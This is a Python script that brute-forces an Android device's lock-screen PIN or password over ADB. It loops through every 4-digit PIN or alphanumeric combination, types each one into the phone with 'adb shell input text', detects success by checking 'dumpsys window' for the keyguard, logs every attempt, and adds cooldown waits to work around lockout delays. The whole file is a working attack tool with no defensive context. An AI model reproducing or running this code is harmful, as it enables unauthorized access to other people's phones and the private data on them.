import subprocess
import time
import itertools
import string

# Countdown with visual timer
def countdown(seconds):
    for i in range(seconds, 0, -1):
        print(f"Waiting... {i}s", end="\r")
        time.sleep(1)
    print(" " * 30, end="\r")  # Clear the line

# Sends the password input via ADB
def send_input(value):
    subprocess.run([r"D:\projects\bruteforce\platform-tools\adb.exe", "shell", "input", "text", value])
    subprocess.run([r"D:\projects\bruteforce\platform-tools\adb.exe", "shell", "input", "keyevent", "66"])  # Press Enter

# Checks if the device is unlocked
def is_unlocked():
    result = subprocess.run(
        [r"D:\projects\bruteforce\platform-tools\adb.exe", "shell", "dumpsys", "window"],
        capture_output=True, text=True
    )
    output = result.stdout
    if "Keyguard" in output or "keyguard" in output:
        return False
    return True

# Main brute force logic
def brute_force(mode="pin", length=4, max_attempts=100):
    charset = string.digits if mode == "pin" else string.ascii_lowercase + string.digits
    attempts = 0

    for combo in itertools.product(charset, repeat=length):
        password = ''.join(combo)
        attempts += 1
        print(f"[{attempts}] Trying: {password}")

        # Log attempt
        with open("log.txt", "a") as log_file:
            log_file.write(f"{attempts}: {password}\n")

        send_input(password)
        time.sleep(2)  # Give the phone a moment to respond

        # Check if the device is unlocked
        if is_unlocked():
            print(f"\n✅ Password FOUND: {password}")
            break

        # Cooldown logic
        if attempts < 10:
            if attempts % 5 == 0:
                print("Cooldown (5-attempt group): 30 sec wait")
                countdown(30)
            else:
                time.sleep(2)
        else:
            print("Cooldown (post-10 attempts): 30 sec wait")
            countdown(30)

        if attempts >= max_attempts:
            print("❌ Max attempts reached. Stopping.")
            break

if __name__ == "__main__":
    brute_force(mode="pin", length=4)
